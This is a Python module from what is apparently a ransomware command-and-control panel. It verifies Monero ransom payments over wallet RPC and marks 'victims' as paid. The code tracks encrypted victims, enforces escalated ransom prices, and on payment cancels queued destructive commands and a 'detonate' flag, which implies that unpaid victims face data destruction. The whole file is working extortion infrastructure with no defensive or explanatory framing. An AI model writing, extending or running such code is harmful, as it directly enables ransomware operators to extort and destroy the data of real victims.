"""Monero wallet-RPC payment verification.

Settings (editable in the panel):
  payment_mode    manual | rpc
  wallet_rpc_url  full JSON-RPC endpoint
  wallet_rpc_user / wallet_rpc_pass
  xmr_usd_rate    USD per 1 XMR; 0 disables automatic verification

Matching: a confirmed incoming transfer whose destination address equals the
victim's xmr_address and whose amount covers price/rate marks the victim paid.
"""

import base64
import json
import math
import urllib.request

import c2db
import notify


def _rpc(method: str, params: dict):
    url = c2db.get_setting("wallet_rpc_url", "")
    if not url:
        raise RuntimeError("wallet_rpc_url not configured")
    body = json.dumps({"jsonrpc": "2.0", "id": "0",
                       "method": method, "params": params}).encode()
    req = urllib.request.Request(url, data=body,
                                 headers={"Content-Type": "application/json"})
    user = c2db.get_setting("wallet_rpc_user", "")
    pw = c2db.get_setting("wallet_rpc_pass", "")
    if user or pw:
        tok = base64.b64encode(f"{user}:{pw}".encode()).decode()
        req.add_header("Authorization", "Basic " + tok)
    with urllib.request.urlopen(req, timeout=12) as r:
        return json.loads(r.read().decode())


def _incoming():
    # Only confirmed transfers ("in"). "pending" means unconfirmed: acting on
    # those would mark a victim paid for a transaction that may never land.
    out = []
    try:
        res = _rpc("get_transfers", {"in": True}).get("result", {})
    except Exception:
        return out
    out.extend(res.get("in") or [])
    return out


def poll_once() -> int:
    """Returns the number of victims marked paid."""
    if c2db.get_setting("payment_mode", "manual") != "rpc":
        return 0
    try:
        rate = float(c2db.get_setting("xmr_usd_rate", "0") or 0)
    except ValueError:
        return 0
    if rate <= 0 or not math.isfinite(rate):
        return 0

    transfers = _incoming()
    if not transfers:
        return 0

    paid = 0
    used_txids = set()
    with c2db.db() as conn:
        rows = conn.execute(
            "SELECT vid, price, xmr_address, timestamp, deadline FROM victims "
            "WHERE status IN ('encrypted','negotiating') "
            "AND COALESCE(price,0) > 0 AND COALESCE(xmr_address,'') != ''").fetchall()
        # A shared/default address cannot identify one victim. Never guess.
        shared = {r[0] for r in conn.execute(
            "SELECT xmr_address FROM victims WHERE status IN ('encrypted','negotiating') "
            "AND COALESCE(xmr_address,'')!='' GROUP BY xmr_address HAVING COUNT(*) > 1"
        ).fetchall()}

        for v in rows:
            if v["xmr_address"] in shared:
                continue
            # Escalated price, not the original quote: a transfer has to cover
            # what the invoice currently asks for.
            need = c2db.effective_price(v) / rate
            for t in transfers:
                txid = (t.get("txid") or "").strip()
                if not txid or txid in used_txids:
                    continue
                addr = (t.get("address") or "").strip()
                try:
                    amount = float(t.get("amount", 0)) / 1e12
                except (TypeError, ValueError):
                    continue
                if not addr or addr != v["xmr_address"] or amount + 1e-9 < need:
                    continue
                # One inbound transfer can credit at most one victim, and a
                # txid already in the ledger is never reused.
                used_txids.add(txid)
                already = conn.execute("SELECT 1 FROM payments WHERE txid=? LIMIT 1",
                                       (txid,)).fetchone()
                if already:
                    continue
                usd = round(amount * rate, 2)
                try:
                    conn.execute(
                        "INSERT INTO payments (vid, amount, note, txid, actor, "
                        "affiliate, ts) VALUES (?,?,?,?,?,?,?)",
                        (v["vid"], usd, f"rpc-auto {amount:.6f} XMR",
                         txid, "payments", "", c2db.now()))
                except Exception:
                    # Another poller claimed this txid first.
                    conn.rollback()
                    continue
                conn.execute(
                    "UPDATE victims SET status='paid', paid_at=?, detonate=0 "
                    "WHERE vid=?", (c2db.now(), v["vid"]))
                conn.commit()
                c2db.cancel_destructive_commands(v["vid"])
                c2db.sync_invoice(v["vid"], "paid")
                c2db.log_event("payments", "paid", v["vid"],
                               f"{amount:.6f} XMR tx {txid[:12]}")
                notify.send(f"payment confirmed: {v['vid'][:12]} "
                            f"({amount:.6f} XMR)")
                paid += 1
                break
    return paid


def configured() -> bool:
    return (c2db.get_setting("payment_mode", "manual") == "rpc"
            and bool(c2db.get_setting("wallet_rpc_url", "")))
